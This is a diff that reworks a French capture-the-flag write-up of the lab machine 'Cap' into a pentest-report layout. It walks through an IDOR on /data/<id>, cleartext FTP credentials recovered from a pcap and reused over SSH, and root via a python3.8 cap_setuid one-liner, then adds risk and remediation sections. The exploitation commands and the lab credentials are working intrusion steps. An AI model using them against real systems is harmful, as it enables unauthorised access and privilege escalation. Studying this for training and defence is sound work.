@@ -8,21 +8,21 @@
 
 ---
 
-## Résumé
+## Description
 
-Cap est une machine Linux dont le vecteur d'entrée est une **IDOR** (Insecure Direct Object Reference) sur une interface web de monitoring réseau. En modifiant un simple identifiant dans l'URL, on récupère une capture réseau (`.pcap`) contenant des identifiants FTP/SSH en clair. La privesc se fait via une **capability Linux** (`cap_setuid`) positionnée sur le binaire Python.
+Cap est une machine Linux dont le vecteur d'entrée est une **IDOR** (Insecure Direct Object Reference) sur une interface web de monitoring réseau : l'application expose des captures réseau par utilisateur via une URL du type `/data/<id>`, sans vérifier que l'utilisateur courant est autorisé à accéder à la capture demandée. Ce type de faille s'inscrit dans le *workflow* d'authentification/autorisation applicative : l'application authentifie correctement l'utilisateur mais ne contrôle pas ses droits sur la ressource ciblée. La chaîne se termine par une élévation de privilèges via une **capability Linux** (`cap_setuid`) positionnée sur le binaire `python3.8`.
 
 ---
 
-## 1. Reconnaissance
+## Exploitation
 
-### Scan Nmap
+### 1. Reconnaissance
 
 ```bash
 nmap -sC -sV 10.10.10.245
 ```
 
-**Résultat — 3 ports TCP ouverts :**
+3 ports TCP ouverts :
 
 | Port | Service |
 |------|---------|
@@ -30,11 +30,9 @@ nmap -sC -sV 10.10.10.245
 | 22   | SSH     |
 | 80   | HTTP    |
 
-Le port 80 héberge un dashboard de sécurité réseau (type interface d'admin/monitoring).
+Le port 80 héberge un dashboard de sécurité réseau (interface d'admin/monitoring).
 
----
-
-## 2. Énumération web & IDOR
+### 2. Découverte et exploitation de l'IDOR
 
 L'application propose des captures réseau par utilisateur via des URLs du type :
 
@@ -42,93 +40,57 @@ L'application propose des captures réseau par utilisateur via des URLs du type 
 http://10.10.10.245/data/<id>
 ```
 
-### Observation
+Le `<id>` est directement manipulable côté client, sans contrôle d'autorisation. En descendant l'ID jusqu'à `0`, on tombe sur la capture correspondant à une session admin/initiale :
 
 ```
-URL : http://10.10.10.245/data/2   =>  affiche des données de session
+http://10.10.10.245/data/0
 ```
 
-Le `<id>` est **directement manipulable**. C'est le point clé : rien ne vérifie que la capture demandée nous appartient.
+On télécharge le fichier `.pcap` associé (bouton "Download").
 
-### Exploitation de l'IDOR
+### 3. Analyse du PCAP (Wireshark)
 
-En descendant l'ID jusqu'à `0`, on tombe sur la capture qui correspond souvent à une session admin/initiale :
+Le `.pcap` contient un échange FTP en clair. Filtre utile : `ftp` ou `ftp.request.command == "PASS"`, puis clic droit → *Follow → TCP Stream* pour isoler l'authentification.
 
-```
-URL : http://10.10.10.245/data/0
-```
-
-On télécharge le fichier `.pcap` associé (bouton "Download" → ouverture dans **Wireshark**).
-
-> **Pourquoi ça marche :** l'IDOR est une faille d'autorisation, pas d'authentification. L'appli t'authentifie bien, mais ne vérifie pas tes *droits* sur la ressource demandée. Toujours tester l'incrémentation/décrémentation d'identifiants exposés.
-
----
-
-## 3. Analyse du PCAP (Wireshark)
-
-Le `.pcap` de `/data/0` contient un login **en clair**. FTP (et un login réutilisable en SSH) transmet les identifiants sans chiffrement.
-
-```
-Follow TCP Stream  =>  identifiants capturés
-```
-
-**Credentials récupérés :**
+Identifiants récupérés :
 
 ```
 user     : nathan
 password : Buck3H4TF0RM3!
 ```
 
-> **Filtre utile dans Wireshark :** `ftp` ou `ftp.request.command == "PASS"` pour isoler l'échange d'authentification. Clic droit sur un paquet → *Follow → TCP Stream*.
+### 4. Accès initial (foothold)
 
----
-
-## 4. Accès initial (foothold)
-
-Les creds fonctionnent en SSH :
+Les mêmes identifiants sont réutilisés en SSH :
 
 ```bash
 ssh nathan@10.10.10.245
 # password : Buck3H4TF0RM3!
 ```
 
-> *Note : si tu disposes d'une clé privée, la syntaxe serait `ssh -i /path/to/private_key nathan@10.10.10.245`. Ici l'accès se fait par mot de passe récupéré dans le pcap.*
-
-### Flag user
-
 ```bash
 cat user.txt
 ```
 
----
+### 5. Élévation de privilèges
 
-## 5. Élévation de privilèges
-
-### Énumération des capabilities
+Énumération des capabilities Linux :
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-**Résultat :**
+Résultat :
 
 ```
 /usr/bin/python3.8 = cap_setuid+ep
 ```
 
-Le binaire `python3.8` possède la capability **`cap_setuid`**, ce qui lui permet de changer d'UID sans être SUID root classique.
-
-### Exploitation
-
-On force l'UID à `0` (root) puis on lance un shell :
+Le binaire `python3.8` possède `cap_setuid`, ce qui permet à un processus lancé via cet interpréteur d'appeler `setuid(0)` et de devenir root sans SUID classique :
 
 ```bash
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
-
-> **Pourquoi ça marche :** `cap_setuid` autorise l'appel `setuid(0)`. Une fois l'UID à 0, tout processus enfant (`/bin/bash`) hérite des privilèges root. C'est plus fin qu'un SUID complet, mais tout aussi dangereux mal configuré. Réflexe à avoir : `getcap -r /` fait partie de tout checklist de privesc Linux (cf. GTFOBins → python → Capabilities).
-
-### Root
 
 ```bash
 id
@@ -139,30 +101,55 @@ cat root.txt
 
 ---
 
-## Chaîne d'attaque (récap)
+## PoC
 
+**Exploitation de l'IDOR :**
+
+```http
+GET /data/0 HTTP/1.1
+Host: 10.10.10.245
 ```
-Nmap (21,22,80)
-   └─> Web dashboard
-        └─> IDOR sur /data/<id>  (id=0)
-             └─> Download .pcap
-                  └─> Wireshark : creds nathan en clair
-                       └─> SSH foothold + user.txt
-                            └─> getcap : python3.8 cap_setuid
-                                 └─> os.setuid(0) → root + root.txt
+
+**Élévation de privilèges via cap_setuid :**
+
+```bash
+getcap -r / 2>/dev/null
+# /usr/bin/python3.8 = cap_setuid+ep
+
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
 ---
 
-## Leçons / points de sécu
+## Risk
 
-- **IDOR** : ne jamais faire confiance à un identifiant côté client ; contrôler l'autorisation ressource par ressource.
-- **Protocoles en clair** : FTP/HTTP transmettent les creds sans chiffrement → sniffables. Utiliser FTPS/SFTP/HTTPS.
-- **Réutilisation de mots de passe** : le même secret servait pour FTP et SSH.
-- **Linux capabilities** : aussi puissantes qu'un SUID root si mal posées. Auditer avec `getcap -r /`.
+- **IDOR** : n'importe quel utilisateur authentifié peut lire les captures réseau de tous les autres utilisateurs (y compris admin) en changeant simplement un identifiant dans l'URL, sans aucune vérification de propriété.
+- **Fuite d'identifiants en clair** : le protocole FTP transmet les identifiants en clair, capturables dans un simple `.pcap` exposé.
+- **Réutilisation de mots de passe** : le même secret sert pour FTP et SSH, ce qui transforme une fuite localisée en compromission complète du compte système.
+- **Élévation de privilèges triviale** : une capability `cap_setuid` mal positionnée sur un interpréteur généraliste (`python3.8`) équivaut à un accès root total pour tout utilisateur pouvant l'exécuter.
+- **Impact global** : compromission complète de la machine (accès root), avec risque de mouvement latéral si les mêmes identifiants sont réutilisés ailleurs.
 
 ---
 
-## Outils utilisés
+## Remediation
 
-`nmap` · navigateur web · `wireshark` · `ssh` · `getcap` · `python3.8`
+- Implémenter un contrôle d'autorisation systématique côté serveur sur chaque ressource identifiée par un ID (vérifier que la ressource demandée appartient bien à l'utilisateur authentifié), plutôt que de faire confiance à un identifiant fourni côté client.
+- Préférer des identifiants non séquentiels/non devinables (UUID) pour les ressources sensibles, en complément — et non en remplacement — du contrôle d'autorisation.
+- Remplacer les protocoles en clair (FTP, HTTP) par leurs équivalents chiffrés (SFTP/FTPS, HTTPS) pour tout transport d'identifiants.
+- Interdire la réutilisation d'un même mot de passe entre plusieurs services/comptes.
+- Auditer régulièrement les capabilities Linux avec `getcap -r /` et retirer toute capability non strictement nécessaire (notamment `cap_setuid` sur des interpréteurs généralistes comme Python).
+
+---
+
+## Résumé
+
+**Machine :** Cap
+**Vulnérabilité principale :** IDOR (`/data/<id>`) + capability Linux `cap_setuid` mal configurée
+**Accès initial :** SSH via identifiants FTP capturés dans le pcap exposé
+**Privilèges obtenus :** Root
+
+**Flags :**
+- User : récupéré via `cat user.txt` après connexion SSH
+- Root : récupéré via `cat root.txt` après `os.setuid(0)`
+
+**Outils utilisés :** `nmap` · navigateur web · `wireshark` · `ssh` · `getcap` · `python3.8`
